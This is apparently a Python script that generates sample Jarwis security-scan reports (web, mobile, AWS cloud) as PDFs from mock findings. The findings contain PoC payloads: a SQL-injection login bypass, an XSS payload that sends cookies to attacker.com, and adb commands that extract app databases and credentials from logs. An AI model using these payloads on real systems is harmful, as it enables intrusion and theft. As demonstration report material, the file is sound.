"""
Generate Sample Jarwis Security Reports - PDF Version
Uses Playwright in subprocess for reliable PDF generation
"""

import sys
import subprocess
import json
from pathlib import Path
from dataclasses import dataclass, asdict
from datetime import datetime
from typing import List

# Add parent to path
sys.path.insert(0, str(Path(__file__).parent.parent))


@dataclass
class ScanResult:
    """Mock scan result for sample reports"""
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    poc: str = ""
    reasoning: str = ""
    remediation: str = ""
    cwe_id: str = ""
    request_data: str = ""
    response_data: str = ""
    response_snippet: str = ""


@dataclass
class MockContext:
    """Mock scan context"""
    endpoints: List[str]
    authenticated: bool
    cookies: dict = None
    
    def __post_init__(self):
        if self.cookies is None:
            self.cookies = {}


def generate_web_findings() -> List[ScanResult]:
    """Generate sample web application findings"""
    return [
        ScanResult(
            id="WEB-001",
            category="A03",
            severity="critical",
            title="SQL Injection in Login Form",
            description="The login form is vulnerable to SQL injection attacks. An attacker can bypass authentication or extract sensitive data from the database by injecting malicious SQL code into the username or password fields.",
            url="https://example.com/api/auth/login",
            method="POST",
            parameter="username",
            evidence="SQL error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version",
            poc="username=admin' OR '1'='1'--&password=test",
            reasoning="Jarwis detected SQL injection by injecting a single quote character which caused the database to return an SQL syntax error. This confirms that user input is being directly concatenated into SQL queries without proper sanitization or parameterized queries.",
            remediation="Use parameterized queries (prepared statements) instead of string concatenation. Implement input validation and sanitization. Consider using an ORM like SQLAlchemy or Django ORM.",
            cwe_id="CWE-89",
            request_data="POST /api/auth/login HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"username\": \"admin' OR '1'='1'--\", \"password\": \"test\"}",
            response_data="HTTP/1.1 500 Internal Server Error\n\n{\"error\": \"SQL error: You have an error in your SQL syntax...\"}"
        ),
        ScanResult(
            id="WEB-002",
            category="A03",
            severity="high",
            title="Reflected Cross-Site Scripting (XSS)",
            description="The search functionality reflects user input without proper encoding, allowing attackers to inject malicious JavaScript that executes in victims' browsers.",
            url="https://example.com/search?q=<script>alert('XSS')</script>",
            method="GET",
            parameter="q",
            evidence="<script>alert('XSS')</script> reflected in response body",
            poc="https://example.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>",
            reasoning="Jarwis injected an XSS payload in the search parameter and found it was reflected verbatim in the HTML response without encoding. This allows arbitrary JavaScript execution in the context of the victim's session.",
            remediation="Encode all user input before rendering in HTML. Use Content-Security-Policy headers. Implement input validation with allowlists.",
            cwe_id="CWE-79",
            request_data="GET /search?q=<script>alert('XSS')</script> HTTP/1.1\nHost: example.com",
            response_data="HTTP/1.1 200 OK\nContent-Type: text/html\n\n<html><body>Search results for: <script>alert('XSS')</script></body></html>"
        ),
        ScanResult(
            id="WEB-003",
            category="A01",
            severity="high",
            title="Insecure Direct Object Reference (IDOR)",
            description="The application allows users to access other users' data by modifying the user ID parameter in API requests.",
            url="https://example.com/api/users/12345/profile",
            method="GET",
            parameter="user_id",
            evidence="Successfully retrieved profile data for user 12345 while authenticated as user 67890",
            poc="Change user_id from 67890 to 12345 in the URL to access another user's profile",
            reasoning="Jarwis tested IDOR by modifying the user ID in the API endpoint while authenticated as a different user. The server returned profile data for the requested user ID without proper authorization checks.",
            remediation="Implement proper authorization checks on the server side. Use indirect references or UUIDs instead of sequential IDs. Verify that the authenticated user has permission to access the requested resource.",
            cwe_id="CWE-639",
            request_data="GET /api/users/12345/profile HTTP/1.1\nHost: example.com\nAuthorization: Bearer eyJhbGc...(token for user 67890)",
            response_data="HTTP/1.1 200 OK\n\n{\"user_id\": 12345, \"email\": \"victim@example.com\", \"name\": \"John Doe\", \"ssn\": \"123-45-6789\"}"
        ),
        ScanResult(
            id="WEB-004",
            category="A05",
            severity="medium",
            title="Missing Security Headers",
            description="The application is missing important security headers that help protect against common web attacks.",
            url="https://example.com/",
            method="GET",
            parameter="",
            evidence="Missing headers: X-Frame-Options, X-Content-Type-Options, Content-Security-Policy, Strict-Transport-Security",
            poc="Check response headers using browser developer tools or curl -I https://example.com/",
            reasoning="Jarwis analyzed the HTTP response headers and found several critical security headers missing. Without these headers, the application is vulnerable to clickjacking, MIME-type sniffing attacks, and other security issues.",
            remediation="Add the following headers: X-Frame-Options: DENY, X-Content-Type-Options: nosniff, Content-Security-Policy: default-src 'self', Strict-Transport-Security: max-age=31536000; includeSubDomains",
            cwe_id="CWE-693",
            request_data="GET / HTTP/1.1\nHost: example.com",
            response_data="HTTP/1.1 200 OK\nContent-Type: text/html\nServer: nginx/1.18.0\n\n<!DOCTYPE html>..."
        ),
        ScanResult(
            id="WEB-005",
            category="A07",
            severity="medium",
            title="Weak Password Policy",
            description="The application accepts weak passwords during registration, allowing users to set easily guessable passwords.",
            url="https://example.com/api/auth/register",
            method="POST",
            parameter="password",
            evidence="Password '123456' was accepted during registration",
            poc="Register with password: 123456, password, qwerty, or other common weak passwords",
            reasoning="Jarwis tested the registration endpoint with common weak passwords and found they were accepted. This allows attackers to easily guess user passwords through brute force or dictionary attacks.",
            remediation="Implement strong password requirements: minimum 12 characters, mix of uppercase, lowercase, numbers, and special characters. Check against lists of commonly breached passwords. Implement rate limiting on login attempts.",
            cwe_id="CWE-521",
            request_data="POST /api/auth/register HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"email\": \"test@test.com\", \"password\": \"123456\"}",
            response_data="HTTP/1.1 201 Created\n\n{\"message\": \"User created successfully\", \"user_id\": 99999}"
        ),
        ScanResult(
            id="WEB-006",
            category="A02",
            severity="low",
            title="Sensitive Data in URL Parameters",
            description="Sensitive information like API keys or session tokens are passed in URL parameters, which may be logged or exposed in browser history.",
            url="https://example.com/api/data?api_key=sk_live_abc123xyz",
            method="GET",
            parameter="api_key",
            evidence="API key found in URL query parameter",
            poc="Review server logs, browser history, or referrer headers for exposed API keys",
            reasoning="Jarwis detected sensitive data (API key) being transmitted in URL parameters. URLs are typically logged by web servers, proxies, and browsers, potentially exposing sensitive credentials.",
            remediation="Move sensitive data to request headers (Authorization header) or POST body. Implement proper API key rotation policies.",
            cwe_id="CWE-598",
            request_data="GET /api/data?api_key=sk_live_abc123xyz HTTP/1.1\nHost: example.com",
            response_data="HTTP/1.1 200 OK\n\n{\"data\": [...]}"
        ),
    ]


def generate_mobile_findings() -> List[ScanResult]:
    """Generate sample mobile application findings"""
    return [
        ScanResult(
            id="MOB-001",
            category="A02",
            severity="critical",
            title="Hardcoded API Keys in APK",
            description="The mobile application contains hardcoded API keys and secrets in the decompiled source code, which can be extracted by any attacker.",
            url="com.example.app/BuildConfig.java",
            method="STATIC",
            parameter="API_KEY",
            evidence="Found: public static final String API_KEY = \"AIzaSyB4x5c7d8e9f0g1h2i3j4k5l6m7n8o9p0\"",
            poc="Use APKTool to decompile: apktool d app.apk && grep -r 'API_KEY' ./app/",
            reasoning="Jarwis performed static analysis on the APK and found hardcoded API keys in the BuildConfig class. These keys can be extracted by anyone who downloads the app from the Play Store.",
            remediation="Never hardcode secrets in mobile apps. Use secure key storage (Android Keystore, iOS Keychain). Implement API key rotation and restrict key permissions on the backend.",
            cwe_id="CWE-798",
            request_data="Static Analysis of: com.example.app.apk\nTool: Androguard + Jarwis Mobile Scanner",
            response_data="BuildConfig.java:\npublic static final String API_KEY = \"AIzaSyB4x5c7d8e9f0g1h2i3j4k5l6m7n8o9p0\";\npublic static final String STRIPE_KEY = \"sk_live_abc123\";"
        ),
        ScanResult(
            id="MOB-002",
            category="A02",
            severity="critical",
            title="Insecure Data Storage - SQLite Database Unencrypted",
            description="The application stores sensitive user data in an unencrypted SQLite database on the device, accessible to anyone with physical access or root privileges.",
            url="com.example.app/databases/user_data.db",
            method="STATIC",
            parameter="database",
            evidence="Unencrypted SQLite database found with user credentials and personal information",
            poc="adb pull /data/data/com.example.app/databases/user_data.db && sqlite3 user_data.db '.dump users'",
            reasoning="Jarwis analyzed the application's data storage and found an unencrypted SQLite database containing sensitive user information including passwords and personal data.",
            remediation="Encrypt the SQLite database using SQLCipher. Use Android EncryptedSharedPreferences for small amounts of data. Implement proper key management using Android Keystore.",
            cwe_id="CWE-312",
            request_data="File Analysis: /data/data/com.example.app/databases/user_data.db",
            response_data="TABLE users:\nid|email|password|ssn|credit_card\n1|john@example.com|password123|123-45-6789|4111111111111111"
        ),
        ScanResult(
            id="MOB-003",
            category="A05",
            severity="high",
            title="SSL Certificate Pinning Not Implemented",
            description="The application does not implement SSL certificate pinning, making it vulnerable to man-in-the-middle attacks.",
            url="https://api.example.com/*",
            method="NETWORK",
            parameter="TLS",
            evidence="Successfully intercepted HTTPS traffic using proxy with custom CA certificate",
            poc="Install Burp Suite CA on device, configure proxy, intercept all API traffic",
            reasoning="Jarwis tested the application's TLS implementation by attempting to intercept traffic with a custom CA certificate. All API traffic was successfully captured, indicating no certificate pinning.",
            remediation="Implement certificate pinning using OkHttp CertificatePinner or TrustKit. Pin to the leaf certificate or public key. Implement backup pins for certificate rotation.",
            cwe_id="CWE-295",
            request_data="Network Interception Test\nProxy: Burp Suite with custom CA\nDevice: Rooted Android with CA installed",
            response_data="All 47 API endpoints intercepted successfully.\nSensitive data captured: auth tokens, PII, payment info"
        ),
        ScanResult(
            id="MOB-004",
            category="A04",
            severity="high",
            title="Debuggable Application in Production",
            description="The application has android:debuggable=true set in the manifest, allowing attackers to attach debuggers and inspect runtime behavior.",
            url="AndroidManifest.xml",
            method="STATIC",
            parameter="debuggable",
            evidence="<application android:debuggable=\"true\" ...>",
            poc="adb shell run-as com.example.app && attach debugger via Android Studio",
            reasoning="Jarwis analyzed the AndroidManifest.xml and found the debuggable flag set to true. This allows attackers to attach debuggers, set breakpoints, and inspect memory at runtime.",
            remediation="Set android:debuggable=\"false\" for production builds. Use ProGuard/R8 for code obfuscation. Implement runtime debugger detection.",
            cwe_id="CWE-489",
            request_data="Manifest Analysis: AndroidManifest.xml",
            response_data="<application\n    android:debuggable=\"true\"\n    android:allowBackup=\"true\"\n    android:name=\".MainApplication\">"
        ),
        ScanResult(
            id="MOB-005",
            category="A01",
            severity="medium",
            title="Exported Activity Without Permission",
            description="A sensitive activity is exported without proper permission protection, allowing other apps to launch it directly.",
            url="com.example.app/.admin.AdminDashboardActivity",
            method="STATIC",
            parameter="exported",
            evidence="<activity android:name=\".admin.AdminDashboardActivity\" android:exported=\"true\"/>",
            poc="adb shell am start -n com.example.app/.admin.AdminDashboardActivity",
            reasoning="Jarwis found an exported activity that appears to be an admin dashboard. Any app on the device can launch this activity, potentially bypassing authentication.",
            remediation="Set android:exported=\"false\" for internal activities. If export is required, add permission protection with signature-level permissions.",
            cwe_id="CWE-926",
            request_data="Manifest Analysis: Exported Components",
            response_data="Exported Activities (unprotected):\n- .admin.AdminDashboardActivity\n- .internal.DebugActivity\n- .settings.HiddenSettingsActivity"
        ),
        ScanResult(
            id="MOB-006",
            category="A09",
            severity="low",
            title="Excessive Logging of Sensitive Data",
            description="The application logs sensitive information to Logcat in production, which can be read by other apps with LOG_READ permission.",
            url="com.example.app",
            method="DYNAMIC",
            parameter="logcat",
            evidence="Found in logcat: 'User password: password123', 'Auth token: eyJhbG...'",
            poc="adb logcat | grep -E 'password|token|key|secret'",
            reasoning="Jarwis monitored Logcat during app usage and found sensitive data being logged. On older Android versions or rooted devices, this data can be accessed by malicious apps.",
            remediation="Remove all sensitive data logging in production. Use ProGuard to strip Log.d/Log.v calls. Implement a custom logger that filters sensitive data.",
            cwe_id="CWE-532",
            request_data="Logcat Monitoring during app execution",
            response_data="D/AuthService: User login attempt - password: password123\nD/ApiClient: Token refresh - new token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
        ),
    ]


def generate_cloud_findings() -> List[ScanResult]:
    """Generate sample cloud security findings"""
    return [
        ScanResult(
            id="CLD-001",
            category="A01",
            severity="critical",
            title="S3 Bucket with Public Access",
            description="An S3 bucket containing sensitive data is publicly accessible to anyone on the internet without authentication.",
            url="s3://company-prod-data.s3.amazonaws.com",
            method="AWS_API",
            parameter="ACL",
            evidence="Bucket ACL allows 's3:GetObject' for Principal: '*'",
            poc="aws s3 ls s3://company-prod-data --no-sign-request",
            reasoning="Jarwis scanned the S3 bucket permissions and found that the bucket ACL allows public read access. Any unauthenticated user can list and download objects from this bucket.",
            remediation="Remove public access from the bucket. Enable S3 Block Public Access at the account level. Use bucket policies with explicit deny for public access. Enable CloudTrail logging for S3.",
            cwe_id="CWE-284",
            request_data="AWS CLI: aws s3api get-bucket-acl --bucket company-prod-data",
            response_data="{\n  \"Grants\": [{\n    \"Grantee\": {\"Type\": \"Group\", \"URI\": \"http://acs.amazonaws.com/groups/global/AllUsers\"},\n    \"Permission\": \"READ\"\n  }]\n}"
        ),
        ScanResult(
            id="CLD-002",
            category="A05",
            severity="critical",
            title="IAM User with Admin Access and No MFA",
            description="An IAM user has AdministratorAccess policy attached without MFA enabled, posing a significant security risk if credentials are compromised.",
            url="arn:aws:iam::123456789012:user/admin-user",
            method="AWS_API",
            parameter="IAM",
            evidence="User has AdministratorAccess policy, MFADevices: []",
            poc="aws iam list-attached-user-policies --user-name admin-user",
            reasoning="Jarwis analyzed IAM configurations and found a user with full administrator access without multi-factor authentication enabled. Compromised credentials would give attackers complete control.",
            remediation="Enable MFA for all IAM users, especially those with admin access. Implement least privilege principle. Use IAM roles instead of long-term credentials where possible.",
            cwe_id="CWE-308",
            request_data="IAM Security Audit",
            response_data="User: admin-user\nPolicies: [AdministratorAccess]\nMFA: DISABLED\nAccess Keys: 2 (both active)\nLast Login: Never (programmatic access only)"
        ),
        ScanResult(
            id="CLD-003",
            category="A05",
            severity="high",
            title="Security Group Allows Unrestricted SSH Access",
            description="A security group allows SSH access (port 22) from any IP address (0.0.0.0/0), exposing EC2 instances to brute force attacks.",
            url="sg-0abc123def456789",
            method="AWS_API",
            parameter="SecurityGroup",
            evidence="Inbound rule: TCP 22 from 0.0.0.0/0",
            poc="aws ec2 describe-security-groups --group-ids sg-0abc123def456789",
            reasoning="Jarwis scanned security group configurations and found an inbound rule allowing SSH from any IP. This exposes instances to brute force attacks and exploitation of SSH vulnerabilities.",
            remediation="Restrict SSH access to known IP ranges. Use AWS Systems Manager Session Manager instead of direct SSH. Implement VPN or bastion host architecture.",
            cwe_id="CWE-284",
            request_data="Security Group Analysis: sg-0abc123def456789",
            response_data="Inbound Rules:\n- TCP 22: 0.0.0.0/0 (SSH - OPEN TO WORLD)\n- TCP 443: 0.0.0.0/0 (HTTPS)\n- TCP 3306: 0.0.0.0/0 (MySQL - OPEN TO WORLD)"
        ),
        ScanResult(
            id="CLD-004",
            category="A02",
            severity="high",
            title="RDS Instance Without Encryption",
            description="A production RDS database instance is not using encryption at rest, potentially exposing sensitive data if storage is compromised.",
            url="arn:aws:rds:us-east-1:123456789012:db:prod-database",
            method="AWS_API",
            parameter="StorageEncrypted",
            evidence="StorageEncrypted: false, Engine: mysql",
            poc="aws rds describe-db-instances --db-instance-identifier prod-database",
            reasoning="Jarwis analyzed RDS configurations and found a production database without encryption at rest enabled. Data on the underlying storage could be accessed if physical security is breached.",
            remediation="Enable encryption at rest for RDS instances. Note: This requires creating a new encrypted instance and migrating data. Use AWS KMS customer-managed keys for key rotation.",
            cwe_id="CWE-311",
            request_data="RDS Configuration Analysis",
            response_data="DBInstance: prod-database\nEngine: mysql 8.0\nStorageEncrypted: false\nPubliclyAccessible: false\nMultiAZ: false\nBackupRetention: 7 days"
        ),
        ScanResult(
            id="CLD-005",
            category="A09",
            severity="medium",
            title="CloudTrail Logging Disabled",
            description="AWS CloudTrail is not enabled for the account, preventing visibility into API calls and security events.",
            url="AWS Account: 123456789012",
            method="AWS_API",
            parameter="CloudTrail",
            evidence="No CloudTrail trails configured for the account",
            poc="aws cloudtrail describe-trails --region us-east-1",
            reasoning="Jarwis checked CloudTrail configuration and found no trails enabled. Without CloudTrail, there is no audit log of API calls, making incident investigation impossible.",
            remediation="Enable CloudTrail in all regions. Configure a multi-region trail with log file validation. Store logs in a separate, protected S3 bucket with versioning enabled.",
            cwe_id="CWE-778",
            request_data="CloudTrail Configuration Check",
            response_data="{\n  \"trailList\": []\n}"
        ),
        ScanResult(
            id="CLD-006",
            category="A06",
            severity="medium",
            title="Lambda Function Using Outdated Runtime",
            description="Lambda functions are using deprecated runtime versions with known security vulnerabilities.",
            url="arn:aws:lambda:us-east-1:123456789012:function:data-processor",
            method="AWS_API",
            parameter="Runtime",
            evidence="Runtime: python3.6 (deprecated, end of support: Dec 2021)",
            poc="aws lambda get-function --function-name data-processor",
            reasoning="Jarwis analyzed Lambda configurations and found functions using deprecated Python 3.6 runtime. This runtime no longer receives security patches, exposing the function to known vulnerabilities.",
            remediation="Update Lambda functions to the latest supported runtime (python3.11 or higher). Test thoroughly before deployment. Set up automated runtime version monitoring.",
            cwe_id="CWE-1104",
            request_data="Lambda Runtime Analysis",
            response_data="Deprecated Runtimes Found:\n- data-processor: python3.6\n- image-resizer: nodejs12.x\n- auth-handler: python3.7"
        ),
        ScanResult(
            id="CLD-007",
            category="A02",
            severity="low",
            title="EBS Volumes Not Encrypted by Default",
            description="The AWS account does not have default EBS encryption enabled, requiring manual encryption for each volume.",
            url="AWS Account Settings",
            method="AWS_API",
            parameter="EBS",
            evidence="EbsEncryptionByDefault: false",
            poc="aws ec2 get-ebs-encryption-by-default --region us-east-1",
            reasoning="Jarwis checked account-level EBS settings and found default encryption is disabled. This means new EBS volumes will be unencrypted unless explicitly specified.",
            remediation="Enable default EBS encryption at the account level for each region. Use AWS KMS for key management. Audit existing unencrypted volumes and migrate data.",
            cwe_id="CWE-311",
            request_data="EBS Default Encryption Check",
            response_data="{\n  \"EbsEncryptionByDefault\": false\n}"
        ),
    ]


def generate_html_to_pdf(html_path: Path, pdf_path: Path) -> bool:
    """Generate PDF from HTML using Playwright in subprocess"""
    # Use forward slashes for cross-platform compatibility
    html_uri = html_path.absolute().as_posix()
    pdf_output = str(pdf_path).replace('\\', '/')
    
    script = f'''
import asyncio
from playwright.async_api import async_playwright

async def main():
    async with async_playwright() as p:
        browser = await p.chromium.launch()
        page = await browser.new_page()
        
        # Set viewport for consistent rendering
        await page.set_viewport_size({{"width": 1200, "height": 800}})
        
        # Navigate to the HTML file
        await page.goto('file:///{html_uri}', wait_until='networkidle')
        
        # Wait for content to fully render
        await asyncio.sleep(1)
        
        # Generate PDF with proper settings
        await page.pdf(
            path=r'{pdf_output}', 
            format='A4', 
            print_background=True,
            margin={{'top': '0mm', 'bottom': '0mm', 'left': '0mm', 'right': '0mm'}},
            prefer_css_page_size=True
        )
        
        await browser.close()
        print('PDF generated successfully')

asyncio.run(main())
'''
    
    try:
        result = subprocess.run(
            [sys.executable, '-c', script],
            capture_output=True,
            text=True,
            timeout=90,
            cwd=str(Path(__file__).parent.parent)
        )
        if result.returncode == 0:
            return True
        else:
            print(f"PDF generation error: {result.stderr}")
            return False
    except Exception as e:
        print(f"PDF subprocess error: {e}")
        return False


def main():
    """Generate all sample reports"""
    # Import reporter for HTML generation
    from core.reporters import ReportGenerator
    
    output_dir = Path(__file__).parent.parent / "sample report"
    output_dir.mkdir(exist_ok=True)
    
    print("=" * 60)
    print("JARWIS SAMPLE REPORT GENERATOR")
    print("=" * 60)
    
    # Define all report configurations
    report_configs = [
        {
            "name": "Web Application Security Assessment",
            "filename": "Jarwis_Web_Security_Report",
            "scan_type": "Web Application Security Assessment",
            "target_url": "https://example-webapp.com",
            "findings": generate_web_findings(),
            "endpoints": [
                "/api/auth/login", "/api/auth/register", "/api/auth/logout",
                "/api/users/{id}/profile", "/api/users/{id}/settings",
                "/api/products", "/api/products/{id}", "/api/cart",
                "/api/orders", "/api/orders/{id}", "/api/payment/process",
                "/search", "/admin/dashboard", "/admin/users"
            ],
            "authenticated": True
        },
        {
            "name": "Mobile Application Security Assessment",
            "filename": "Jarwis_Mobile_Security_Report",
            "scan_type": "Mobile Application (Android) Security Assessment",
            "target_url": "com.example.mobileapp (v2.5.1)",
            "findings": generate_mobile_findings(),
            "endpoints": [
                "MainActivity", "LoginActivity", "DashboardActivity",
                "ProfileFragment", "SettingsFragment", "PaymentActivity",
                "NetworkService", "DatabaseHelper", "SharedPrefsManager",
                "CryptoUtils", "BiometricAuth", "PushNotificationService"
            ],
            "authenticated": True
        },
        {
            "name": "Cloud Infrastructure Security Assessment",
            "filename": "Jarwis_Cloud_Security_Report",
            "scan_type": "AWS Cloud Infrastructure Security Assessment",
            "target_url": "AWS Account: 123456789012 (us-east-1)",
            "findings": generate_cloud_findings(),
            "endpoints": [
                "S3 Buckets (15)", "EC2 Instances (23)", "RDS Databases (5)",
                "Lambda Functions (47)", "IAM Users (12)", "IAM Roles (35)",
                "Security Groups (28)", "VPCs (3)", "CloudFront (4)",
                "API Gateway (8)", "DynamoDB Tables (7)", "EKS Clusters (2)"
            ],
            "authenticated": True
        }
    ]
    
    generated_files = []
    
    for config in report_configs:
        print(f"\n🔄 Generating: {config['name']}")
        print(f"   Target: {config['target_url']}")
        print(f"   Findings: {len(config['findings'])}")
        
        # Create mock context
        context = MockContext(
            endpoints=config["endpoints"],
            authenticated=config["authenticated"]
        )
        
        # Create report config
        report_config = {
            "target": {
                "url": config["target_url"],
                "name": config["filename"],
                "type": config["scan_type"]
            }
        }
        
        # Initialize generator with HTML format
        generator = ReportGenerator(str(output_dir), ["html"])
        
        # Generate HTML report first (synchronously using asyncio.run)
        import asyncio
        try:
            html_files = asyncio.run(generator.generate(
                findings=config["findings"],
                context=context,
                config=report_config,
                traffic_log=[],
                executive_summary=None,
                attack_chains=[]
            ))
            
            if html_files:
                html_path = Path(html_files[0])
                print(f"   [OK] HTML generated: {html_path.name}")
                
                # Generate PDF from HTML using subprocess
                pdf_path = output_dir / f"{config['filename']}.pdf"
                print(f"   [DOC] Converting to PDF...")
                
                success = generate_html_to_pdf(html_path, pdf_path)
                
                if success and pdf_path.exists():
                    print(f"   [OK] PDF generated: {pdf_path.name}")
                    generated_files.append(str(pdf_path))
                else:
                    print(f"   [!] PDF generation failed, keeping HTML: {html_path.name}")
                    generated_files.append(str(html_path))
        except Exception as e:
            print(f"   [X] Error: {e}")
            import traceback
            traceback.print_exc()
    
    print("\n" + "=" * 60)
    print("GENERATION COMPLETE")
    print("=" * 60)
    print(f"\nGenerated {len(generated_files)} reports in: {output_dir}")
    for f in generated_files:
        print(f"  [DOC] {Path(f).name}")
    
    return generated_files


if __name__ == "__main__":
    main()
